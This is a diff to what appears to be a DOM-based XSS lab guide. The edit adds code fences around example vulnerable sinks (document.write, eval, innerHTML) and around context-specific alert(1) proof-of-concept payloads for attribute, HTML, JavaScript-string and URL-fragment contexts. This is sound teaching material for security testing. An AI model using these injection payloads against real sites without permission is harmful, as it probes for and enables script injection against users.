@@ -894,9 +894,9 @@ Common sinks:
 - Function()  
 ```
 Example vulnerable code:
-
+```
 document.write(location.search)
-
+```
 ---
 
 ## 🔹 Lab Walkthrough (Simple & Clear)
@@ -916,9 +916,9 @@ site.com/?search=test
 ### Step 2 — Test Reflection with Safe Marker
 
 Input:
-
+```
 ABC123
-
+```
 Open **Developer Tools → Inspector**
 
 Search for:
@@ -938,19 +938,19 @@ Input appears inside an **image src attribute**.
 ### Step 3 — Identify JavaScript Vulnerability
 
 The page uses:
-
+```
 document.write()
-
+```
 with:
-
+```
 location.search
-
+```
 Data flow:
-
+```
 location.search  
 → document.write()  
 → DOM
-
+```
 JavaScript is writing attacker input directly into the DOM.
 
 ---
@@ -1073,13 +1073,13 @@ Very common in:
 ## 🟢 4️⃣ JavaScript Execution Sinks
 
 Example:
-
+```
 eval(location.hash)
-
+```
 Payload:
-
+```
 #alert(1)
-
+```
 Also vulnerable:
 
 - setTimeout(location.hash)  
@@ -1096,13 +1096,13 @@ Seen in:
 ## 🟢 5️⃣ URL Fragment Attacks
 
 Example source:
-
+```
 location.hash
-
+```
 URL:
-
+```
 site.com/#<img src=x onerror=alert(1)>
-
+```
 Common in:
 ```
 - Single-page applications  
@@ -1114,14 +1114,14 @@ Common in:
 ## 🟢 6️⃣ Search Result Rendering
 
 Example code:
-
+```
 document.getElementById("results").innerHTML =
 "You searched: " + location.search
-
+```
 Payload:
-
+```
 <img src=x onerror=alert(1)>
-
+```
 Seen in:
 ```
 - E-commerce search pages  
@@ -1133,9 +1133,9 @@ Seen in:
 ## 🟢 7️⃣ Referrer-Based DOM XSS
 
 Source:
-
+```
 document.referrer
-
+```
 If attacker controls referring page → payload executes.
 
 Seen in:
@@ -1264,17 +1264,17 @@ Look for:
 ## Step 5 — Craft Payload Based on Context
 
 Attribute context:
-
+```
 "><svg onload=alert(1)>
-
+```
 HTML context:
-
+```
 <script>alert(1)</script>
-
+```
 JS string context:
-
+```
 ';alert(1);//
-
+```
 ---
 
 # 🛡️ Remediation (Developer Fix)
